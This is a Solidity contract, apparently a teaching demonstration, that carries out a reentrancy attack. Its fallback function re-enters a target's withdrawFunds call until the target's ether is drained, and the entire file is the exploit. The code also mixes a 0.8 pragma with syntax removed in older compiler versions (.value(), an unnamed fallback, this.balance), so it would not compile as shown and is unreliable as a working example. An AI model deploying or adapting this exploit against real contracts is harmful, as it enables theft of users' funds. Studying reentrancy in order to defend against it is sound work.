// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./VunContract.sol";

contract AttackVunContract {
    VunContract public vunContract;

    // initialize the vunContract variable with the contract address
    constructor(address vunContractAddress) {
        vunContract = VunContract(vunContractAddress);
    }

    function attackVunContract() external payable {
        // attack to the nearest ether
        require(msg.value >= 1 ether);
        // send eth to the depositFunds() function
        vunContract.depositFunds.value(1 ether)();
        // start the magic
        vunContract.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    // fallback function - where the magic (attack) happens
    //Since the VunContract is making external call before updating state
    //this will keep withdrawing until all the ethers in the VunContract is drained
    function () payable {
        if (vunContract.balance > 1 ether) {
            vunContract.withdrawFunds(1 ether);
        }
    }
}